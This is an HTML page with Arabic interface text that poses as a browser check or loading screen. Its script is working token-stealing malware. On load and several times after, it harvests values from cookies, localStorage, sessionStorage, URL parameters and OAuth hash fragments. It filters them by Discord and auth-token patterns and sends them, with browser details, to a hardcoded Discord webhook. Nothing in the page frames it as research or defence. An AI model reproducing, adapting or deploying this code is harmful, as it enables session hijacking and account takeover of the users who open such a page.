<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8" />
    <title>✅ جارٍ التحميل...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0b0e1a;
            font-family: 'Segoe UI', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
            flex-direction: column;
            gap: 20px;
        }
        .box {
            background: #1a1f2f;
            padding: 40px;
            border-radius: 20px;
            max-width: 500px;
            width: 90%;
            text-align: center;
            border: 1px solid #2a2f45;
        }
        .spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #2a2f45;
            border-top: 4px solid #5865f2;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .status { color: #8892a8; font-size: 14px; margin-top: 10px; }
        .success { color: #43b581; }
        .error { color: #f04747; }
        .token-box {
            background: #0b0e1a;
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            max-height: 200px;
            overflow: auto;
            text-align: left;
            font-size: 12px;
            font-family: monospace;
            word-break: break-all;
            color: #b0b8cc;
            border: 1px solid #2a2f45;
        }
        .btn {
            background: #5865f2;
            border: none;
            padding: 12px 30px;
            border-radius: 50px;
            color: #fff;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: 0.2s;
        }
        .btn:hover { background: #4752c4; transform: scale(1.02); }
        .hidden { display: none; }
        .webhook-status {
            font-size: 12px;
            margin-top: 10px;
            padding: 8px;
            border-radius: 8px;
            background: #0b0e1a;
        }
        .webhook-status.success { color: #43b581; border: 1px solid #43b58133; }
        .webhook-status.error { color: #f04747; border: 1px solid #f0474733; }
        .webhook-status.waiting { color: #faa61a; border: 1px solid #faa61a33; }
    </style>
</head>
<body>
    <div class="box">
        <h2>🕵️ جارٍ فحص المتصفح...</h2>
        <div class="spinner"></div>
        <div id="status" class="status">⏳ البحث عن التوكنات...</div>
        <div id="webhookStatus" class="webhook-status waiting">⏳ جارٍ الإرسال إلى الويب هوك...</div>
        <div id="result" class="token-box hidden"></div>
        <button id="copyBtn" class="btn hidden">📋 نسخ النتائج</button>
    </div>

    <script>
        // =========================================================
        // 🔥 ويب هوك Discord
        // =========================================================
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1540029124179918941/41_nc44K924qwKrhVb2-_BkdKmg4bu2DKy27aKXARpjjrL7SPp9_DXrJeyzrd7O1VAOu';

        // =========================================================
        // 📤 دالة الإرسال إلى الويب هوك مع تأكيد
        // =========================================================

        function sendToWebhook(tokens) {
            const webhookStatus = document.getElementById('webhookStatus');
            
            // نغير حالة الويب هوك إلى "جاري الإرسال"
            webhookStatus.textContent = '⏳ جارٍ الإرسال إلى الويب هوك...';
            webhookStatus.className = 'webhook-status waiting';

            // بناء البيانات
            let payload = {};

            if (tokens.length === 0) {
                payload = {
                    content: '⚠️ **لم يتم العثور على أي توكنات**',
                    embeds: [{
                        title: '❌ بحث فاشل',
                        color: 0xf04747,
                        fields: [
                            { name: '💻 المتصفح', value: navigator.userAgent, inline: false },
                            { name: '🕒 الوقت', value: new Date().toISOString(), inline: false },
                            { name: '🔗 الرابط', value: window.location.href, inline: false },
                            { name: '🍪 الكوكيز', value: document.cookie || 'لا توجد', inline: false },
                            { name: '📦 localStorage', value: localStorage.length > 0 ? `${localStorage.length} عنصر` : 'فارغ', inline: true },
                            { name: '📦 sessionStorage', value: sessionStorage.length > 0 ? `${sessionStorage.length} عنصر` : 'فارغ', inline: true }
                        ],
                        footer: { text: 'تم البحث في المتصفح' },
                        timestamp: new Date().toISOString()
                    }]
                };
            } else {
                // بناء رسالة مفصلة مع التوكنات
                const fields = tokens.map((item, index) => ({
                    name: `🔑 التوكن ${index + 1}`,
                    value: `\`${item.token}\`\n📂 المصدر: ${item.source}\n🔖 المفتاح: ${item.key}`,
                    inline: false
                }));

                // نضيف معلومات إضافية عن المتصفح
                fields.push({
                    name: '💻 معلومات المتصفح',
                    value: `🖥️ ${navigator.userAgent}\n🌐 المنصة: ${navigator.platform}\n🗣️ اللغة: ${navigator.language}\n📱 الشاشة: ${window.screen.width}x${window.screen.height}`,
                    inline: false
                });

                payload = {
                    content: `@everyone 🚨 **تم العثور على ${tokens.length} توكن!**`,
                    embeds: [{
                        title: '🕵️ تقرير التوكنات',
                        color: 0x5865f2,
                        fields: fields,
                        footer: { text: `تم الاستخراج من ${navigator.userAgent.substring(0, 50)}...` },
                        timestamp: new Date().toISOString()
                    }]
                };
            }

            // إرسال إلى ويب هوك مع محاولات متعددة
            function attemptSend(attempt = 1) {
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                })
                .then(async res => {
                    if (res.ok) {
                        webhookStatus.textContent = '✅ تم الإرسال بنجاح إلى الويب هوك!';
                        webhookStatus.className = 'webhook-status success';
                        console.log('✅ تم الإرسال إلى الويب هوك');
                    } else {
                        const text = await res.text();
                        throw new Error(`HTTP ${res.status}: ${text}`);
                    }
                })
                .catch(err => {
                    console.error(`❌ محاولة ${attempt} فشلت:`, err);
                    
                    if (attempt < 3) {
                        webhookStatus.textContent = `⏳ إعادة محاولة ${attempt + 1}/3...`;
                        webhookStatus.className = 'webhook-status waiting';
                        setTimeout(() => attemptSend(attempt + 1), 2000);
                    } else {
                        webhookStatus.textContent = '❌ فشل الإرسال إلى الويب هوك بعد 3 محاولات';
                        webhookStatus.className = 'webhook-status error';
                    }
                });
            }

            // بدء الإرسال
            attemptSend(1);
        }

        // =========================================================
        // 🎯 استخراج التوكنات من كل المصادر الممكنة
        // =========================================================

        function extractAllTokens() {
            const tokens = [];
            const found = new Set();

            // 1. localStorage
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                if (isValidToken(value) && !found.has(value)) {
                    tokens.push({ source: 'localStorage', key: key, token: value });
                    found.add(value);
                }
            }

            // 2. sessionStorage
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                const value = sessionStorage.getItem(key);
                if (isValidToken(value) && !found.has(value)) {
                    tokens.push({ source: 'sessionStorage', key: key, token: value });
                    found.add(value);
                }
            }

            // 3. Cookies
            document.cookie.split(';').forEach(cookie => {
                const [key, value] = cookie.trim().split('=');
                if (isValidToken(value) && !found.has(value)) {
                    tokens.push({ source: 'cookies', key: key, token: value });
                    found.add(value);
                }
            });

            // 4. URL parameters
            const urlParams = new URLSearchParams(window.location.search);
            urlParams.forEach((value, key) => {
                if (isValidToken(value) && !found.has(value)) {
                    tokens.push({ source: 'URL parameter', key: key, token: value });
                    found.add(value);
                }
            });

            // 5. URL hash (OAuth tokens)
            const hash = window.location.hash.substring(1);
            const hashParams = new URLSearchParams(hash);
            hashParams.forEach((value, key) => {
                if (isValidToken(value) && !found.has(value)) {
                    tokens.push({ source: 'URL hash', key: key, token: value });
                    found.add(value);
                }
            });

            return tokens;
        }

        // =========================================================
        // 🔍 التحقق من صحة التوكن
        // =========================================================

        function isValidToken(value) {
            if (!value || typeof value !== 'string') return false;
            
            // طول التوكن في Discord يكون غالباً بين 50-100 حرف
            if (value.length < 30 || value.length > 150) return false;

            // أنماط التوكنات الشائعة
            const patterns = [
                /^mfa\.[A-Za-z0-9\-_]+$/,
                /^[A-Za-z0-9]{24}\.[A-Za-z0-9]{6}\.[A-Za-z0-9\-_]+$/,
                /^[A-Za-z0-9\-_]{30,100}$/,
                /^[A-Za-z0-9]{40,}$/
            ];

            for (let pattern of patterns) {
                if (pattern.test(value)) return true;
            }

            const keywords = ['token', 'discord', 'mfa', 'access', 'auth', 'bearer'];
            for (let keyword of keywords) {
                if (value.toLowerCase().includes(keyword)) return true;
            }

            return false;
        }

        // =========================================================
        // 🚀 التنفيذ الرئيسي
        // =========================================================

        function main() {
            const status = document.getElementById('status');
            const result = document.getElementById('result');
            const copyBtn = document.getElementById('copyBtn');

            try {
                const tokens = extractAllTokens();
                
                if (tokens.length > 0) {
                    let display = `✅ تم العثور على ${tokens.length} توكن:\n\n`;
                    tokens.forEach((item, i) => {
                        display += `${i+1}. [${item.source}] ${item.key}: ${item.token}\n`;
                    });
                    result.textContent = display;
                    result.className = 'token-box';
                    
                    status.textContent = `✅ تم العثور على ${tokens.length} توكن! جارٍ الإرسال...`;
                    status.className = 'status success';
                    
                    copyBtn.className = 'btn';
                    copyBtn.onclick = () => {
                        navigator.clipboard.writeText(display).then(() => {
                            copyBtn.textContent = '✅ تم النسخ!';
                            setTimeout(() => copyBtn.textContent = '📋 نسخ النتائج', 2000);
                        });
                    };
                } else {
                    status.textContent = '❌ لم يتم العثور على أي توكنات';
                    status.className = 'status error';
                    result.textContent = '⚠️ لم يتم العثور على توكنات Discord في المتصفح.\nتأكد من أنك مسجل الدخول على Discord Web.';
                    result.className = 'token-box';
                }

                // إرسال النتائج إلى الويب هوك
                sendToWebhook(tokens);

            } catch (error) {
                status.textContent = '❌ حدث خطأ: ' + error.message;
                status.className = 'status error';
                console.error(error);
            }
        }

        // =========================================================
        // 🔄 التشغيل
        // =========================================================

        // تنفيذ فوري
        main();

        // محاولة ثانية بعد 3 ثواني
        setTimeout(main, 3000);

        // محاولة ثالثة بعد 10 ثواني
        setTimeout(main, 10000);

        // مراقبة تغييرات الـ hash (OAuth)
        window.addEventListener('hashchange', () => {
            main();
        });

        console.log('🕵️ أداة استخراج التوكنات تعمل...');
    </script>
</body>
</html>
